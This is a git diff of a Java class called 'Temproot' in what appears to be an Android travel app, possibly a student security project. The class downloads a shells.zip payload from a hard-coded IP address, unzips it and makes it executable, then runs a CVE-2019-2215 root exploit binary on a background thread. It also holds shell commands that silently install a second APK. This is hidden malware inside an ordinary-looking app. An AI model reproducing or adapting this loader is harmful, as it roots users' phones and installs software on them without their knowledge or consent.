@@ -1,8 +1,16 @@
+import android.content.ActivityNotFoundException;
 import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.net.Uri;
+import android.os.Build;
 import android.util.Log;
+
+import androidx.core.content.FileProvider;
 
 import org.jetbrains.annotations.NotNull;
 
+import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.IOException;
@@ -14,65 +22,112 @@ import java.net.URL;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipInputStream;
 
+import edu.singaporetech.travelapp.BuildConfig;
+
 
 public class Temproot {
     public Temproot(@NotNull Context context) throws IOException {
         String URL = "http://192.168.157.73:8080/process_command";
-        //String FILENAME = "shells.zip";
-        String filenames[] = {"shells.zip", "cve-2019-2215", "install.sh", "installapp.sh"};
+        String filenames[] = {"shells.zip", "cve-2019-2215", "install.sh", "com.simplemobiletools.calculator.apk"};
 
         String filePath = "/data/data/edu.singaporetech.travelapp/files"; // /data/data/<package>/files
         String localPath = filePath + "/" + filenames[0];
         Log.d("Temproot", "LOCAL PATH: " + localPath);
-
+        String secondPkgName = "com.simplemobiletools.calculator";
 
         String cmd_chmod = "/system/bin/chmod 755 " + localPath;
-        String cmd_remount = "" + filePath + "/" + filenames[2];
-        String cmd_execcve = "./" + filePath + "/" + filenames[1];
-        String cmd[] = { cmd_chmod, cmd_remount, cmd_execcve};
+        String cmd_execcve = "." + filePath + "/" + filenames[1];
+        String cmd_unzip = "/system/bin/unzip " + filePath + "/" + filenames[0] + " -d " + filePath + "/";
+
+        // pm install -i <package name> --user 0 <apk path>
+//        String cmd_installApk = "/system/bin/pm install -i " + secondPkgName + " --user 0 " + filePath + "/" + filenames[3];
+        String cmd_installApk = "/system/bin/pm install -i -r com.simplemobiletools.calculator --user 0 " + "/data/local/tmp" + "/" + filenames[3];
+        String cmd[] = { cmd_chmod,  cmd_unzip, cmd_execcve, cmd_installApk};
 
 
         Thread thread = new Thread(new Runnable() {
             @Override
             public void run() {
-                download(URL, localPath);
+//                download(URL, localPath);
 
-                Log.d("Temproot", "Executing chmod 755 on shells.zip...");
-                exec(cmd[0]);
-                Log.d("Temproot", "Execution chmod complete...");
+                Runtime rt = Runtime.getRuntime();
 
-                Log.d("Temproot", "Executing unzip...");
-                unzip(localPath, filePath + "/");
-                Log.d("Temproot", "Execution unzip complete...");
+                try {
+//                    Log.d("Temproot", "Executing chmod 755 on shells.zip...");
+//                    rt.exec(cmd[0]);
+//                    Log.d("Temproot", "Execution chmod complete...");
+//
+//                    Log.d("Temproot", "Executing unzip...");
+////                    unzip(localPath, filePath + "/");
+//                    rt.exec(cmd[1]);
+//                    Log.d("Temproot", "Execution unzip complete...");
+//
+//                    Log.d("Temproot", "Executing chmod 755 on unzipped files...");
+//                    for (int i = 1; i < filenames.length; i++){
+//                        rt.exec("/system/bin/chmod 755 " + filePath + "/" + filenames[i]).waitFor();
+//                    }
+//                    Log.d("Temproot", "Execution chmod complete...");
+//
+                    Log.d("Temproot", "Executing cve-2019-2215...");
+                    rt.exec(cmd[2]);
+//                    rt.exec(cmd[2]).waitFor();
+                    Log.d("Temproot", "CVE ROOT COMPLETE");
 
-                Log.d("Temproot", "Executing chmod 755 on unzipped files...");
-                for (int i = 1; i < filenames.length; i++){
-                    exec("/system/bin/chmod 755 " + filePath + "/" + filenames[i]);
-                }
-                Log.d("Temproot", "Execution chmod complete...");
+//                    Log.d("Temproot", "Installing second apk...");
+////                    rt.exec("/system/bin/ls");
 
-                Log.d("Temproot", "Executing cve-2019-2215...");
-                exec(cmd[2]);
+//                    rt.exec("./data/data/edu.singaporetech.travelapp/files/busybox sh /system/bin/pm install /data/data/edu.singaporetech.travelapp/files/com.simplemobiletools.calculator.apk");
+//                    rt.exec(cmd[3]);
+//                    File file = new File(filePath + "/" + filenames[3]);
+//                    Intent install = new Intent(Intent.ACTION_VIEW);
+//                    install.setDataAndType(uriFromFile(context, file), "application/vnd.android.package-archive");
+//                    install.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+//                    install.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+//                    try {
+//                        context.startActivity(install);
+//                    } catch (ActivityNotFoundException e) {
+//                        e.printStackTrace();
+//                        Log.d("Temproot", "Error in opening the file");
+//                    }
+//                    Log.d("Temproot", "Second apk installed");
 
-//                Log.d("Temproot", "Executing install.sh...");
-//                exec(cmd[1]);
-//                Log.d("Temproot", "Execution install.sh...");
+                    Log.d("Temproot", "Starting second apk...");
+                    PackageManager pm = context.getPackageManager();
+                    Intent intent = pm.getLaunchIntentForPackage("com.whatsapp");
+                    if (intent != null){
+                        context.startActivity(intent);
+                    }
 
+                    Log.d("Temproot", "Second apk started");
+                } catch (IOException e) {
+                    e.printStackTrace();
+                } //catch (InterruptedException e) {
+//                    e.printStackTrace();
+//                }
 
             }
         });
         thread.start();
     }
 
-    private void exec(String cmd) {
-        try {
-            Process process = Runtime.getRuntime().exec(cmd);
-        } catch (InterruptedIOException e) {
-            throw new RuntimeException(e);
-        } catch (IOException e) {
-            throw new RuntimeException(e);
+    private Uri uriFromFile(Context context, File file) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            return FileProvider.getUriForFile(context, BuildConfig.APPLICATION_ID + ".provider", file);
+        }
+        else {
+            return Uri.fromFile(file);
         }
     }
+
+//    private void exec(String cmd) {
+//        try {
+//            Process process = Runtime.getRuntime().exec(cmd);
+//        } catch (InterruptedIOException e) {
+//            throw new RuntimeException(e);
+//        } catch (IOException e) {
+//            throw new RuntimeException(e);
+//        }
+//    }
 
     private void download(String urlStr, String localPath) {
         try {
